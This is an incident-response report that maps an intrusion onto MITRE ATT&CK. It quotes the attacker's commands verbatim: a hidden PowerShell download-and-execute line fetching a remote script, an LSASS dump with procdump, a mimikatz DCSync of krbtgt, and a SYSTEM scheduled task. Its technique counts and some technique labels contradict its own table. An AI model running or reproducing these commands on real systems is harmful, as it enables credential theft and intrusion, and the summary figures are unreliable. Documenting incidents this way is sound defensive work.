# MITRE ATT&CK Mapping: Operation Silent Cascade

**Incident ID:** INC-2024-07182
**Threat Actor:** APT-SILENT-47

---

## ATT&CK Matrix Overview

This document maps all observed adversary behaviors during Operation Silent Cascade to the MITRE ATT&CK framework (v14+). Each entry includes the tactic, technique identifier, technique name, and the specific procedure observed in the incident.

---

## Comprehensive TTP Mapping Table

| Tactic | Technique ID | Technique Name | Procedure Example (from Incident) |
|---|---|---|---|
| **Initial Access** | T1566.001 | Spearphishing Attachment | Attacker sent email from `cfo-quarterly-reports@corp-finance-review.com` to MAIL-01 (10.10.1.5) with subject "Q3 Financial Review - Action Required" containing `Q3_Financial_Review.xlsm` macro-enabled attachment |
| **Execution** | T1204.002 | Malicious File Execution | User on WORKSTATION-01 executed `Q3_Financial_Review.xlsm` from Downloads folder; EXCEL.EXE opened the file (Event 4688) |
| **Execution** | T1059.001 | PowerShell | EXCEL.EXE spawned `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://update-service.cloud-cdn.net/payload/stage1.ps1')` |
| **Execution / Defense Evasion** | T1218.011 | Signed Binary Proxy Execution: Rundll32 | Malicious DLL (`update.dll`) dropped on WORKSTATION-01 and executed via `rundll32.exe` — a legitimate, signed Windows binary (LOLBin technique) |
| **Command and Control** | T1071.004 | Application Layer Protocol: DNS | C2 channel established over TCP to `update-service.cloud-cdn.net` resolving to 203.0.113.50; direct connection to 203.0.113.100:8443 |
| **Persistence** | T1053.005 | Scheduled Task / Job | Scheduled task created on WORKSTATION-01 to execute `stage1.ps1` every 15 minutes as SYSTEM |
| **Persistence** | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | Registry Run key established at `Software\Microsoft\Windows\CurrentVersion\Run` via rundll32.exe on WORKSTATION-01 |
| **Discovery** | T1018 | Remote System Discovery | `cmd.exe /c net view /domain:CORP` executed on WORKSTATION-01 to enumerate systems in the CORP domain |
| **Discovery** | T1087.002 | Account Discovery: Domain Account | `cmd.exe /c net group "Domain Admins" /domain` executed on WORKSTATION-01 to enumerate privileged domain accounts |
| **Credential Access** | T1003.001 | OS Credential Dumping: LSASS Memory | `procdump64.exe -ma lsass.exe lsass.dmp` executed on WORKSTATION-01 at 12:22:45 to extract credentials from LSASS process memory |
| **Credential Access / Privilege Escalation** | T1003.006 | OS Credential Dumping: DCSync | `mimikatz.exe lsadump::dcsync /domain:corp.local /user:krbtgt` executed on DC-01; Event 4662 triggered for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All GUIDs |
| **Lateral Movement** | T1021.002 | Remote Services: SMB / Windows Admin Shares | Attacker used stolen account `a.mitchell` to authenticate to DC-01 (10.10.1.10) via SMB administrative share (Event 4624 — Logon Type 3) |
| **Discovery** | T1087.002 | Account Discovery: Domain Account | `cmd.exe /c whoami /all` executed on DC-01 (parent process: service.exe) to enumerate identity context and privileges post-compromise |
| **Lateral Movement** | T1021.002 | Remote Services: SMB / Windows Admin Shares | Attacker accessed FILESERVER-01 (10.10.1.20) from DC-01 via SMB (port 445) to collect sensitive files |
| **Collection** | T1560.001 | Archive Collected Data | Attacker collected `Client_Portfolio_2024.xlsx` and `M&A_Due_Diligence.docx` from `\\FILESERVER-01\Finance` share |
| **Command and Control** | T1071.004 | Application Layer Protocol: DNS | Secondary C2 channel established from DC-01 to 203.0.113.50:8443 |
| **Exfiltration** | T1048.003 | Exfiltration Over Alternative Protocol: DNS | Data exfiltrated via high-volume DNS TXT queries to `data.trustedservices.online` (203.0.113.50); Base64-encoded chunks appended as subdomains (e.g., `ZmlsZTE.test.data.trustedservices.online`, `cmVwb3J0.test.data.trustedservices.online`, `dHVubmVs.test.data.trustedservices.online`, `Y29tcGxldGU.test.data.trustedservices.online`); each query approximately 1,408 bytes |
| **Persistence** | T1053.005 | Scheduled Task / Job | Scheduled task `DCSyncJob` created on DC-01: `schtasks.exe /create /tn DCSyncJob /tr powershell.exe -File dc_update.ps1 /sc minute /mo 30 /ru SYSTEM` |
| **Defense Evasion** | T1070.004 | Indicator Removal on Host: File Deletion | `cmd.exe /c del /q output.zip` executed to remove exfiltration evidence; `mimikatz.exe` also deleted |
| **Exfiltration / Command and Control** | T1105 | Ingress Tool Transfer | Final payload and exfiltrated data staged to `staging.trustedservices.online` (203.0.113.51) |

---

## ATT&CK Kill Chain Summary

```mermaid
graph LR
    A[T1566.001<br/>Spearphishing] --> B[T1204.002<br/>Malicious File]
    B --> C[T1059.001<br/>PowerShell]
    C --> D[T1218.011<br/>Rundll32 LOLBin]
    D --> E[T1071.004<br/>C2 Channel]
    E --> F[T1053.005<br/>Scheduled Task]
    E --> G[T1547.001<br/>Registry Run Key]
    F --> H[T1018<br/>System Discovery]
    G --> H
    H --> I[T1087.002<br/>Account Discovery]
    I --> J[T1003.001<br/>LSASS Dump]
    J --> K[T1021.002<br/>Lateral Movement to DC-01]
    K --> L[T1003.006<br/>DCSync Attack]
    L --> M[T1053.005<br/>DC Persistence]
    M --> N[T1021.002<br/>Lateral Movement to FS-01]
    N --> O[T1560.001<br/>Data Collection]
    O --> P[T1071.004<br/>Secondary C2]
    P --> Q[T1048.003<br/>DNS Exfiltration]
    Q --> R[T1070.004<br/>Defense Evasion]
    R --> S[T1105<br/>Final Staging]
```

---

## Observations by Tactic Count

| Tactic | Techniques Observed | Count |
|---|---|---|
| Initial Access | T1566.001 | 1 |
| Execution | T1204.002, T1059.001, T1218.011 | 3 |
| Persistence | T1053.005, T1547.001 | 3 (2 scheduled tasks, 1 registry run key) |
| Defense Evasion | T1218.011, T1070.004 | 2 |
| Credential Access | T1003.001, T1003.006 | 2 |
| Discovery | T1018, T1087.002 | 3 |
| Lateral Movement | T1021.002 | 2 |
| Collection | T1560.001 | 1 |
| Command and Control | T1071.004 | 2 |
| Exfiltration | T1048.003, T1105 | 2 |

**Total Unique Techniques:** 13
**Total Individual TTP Events:** 19
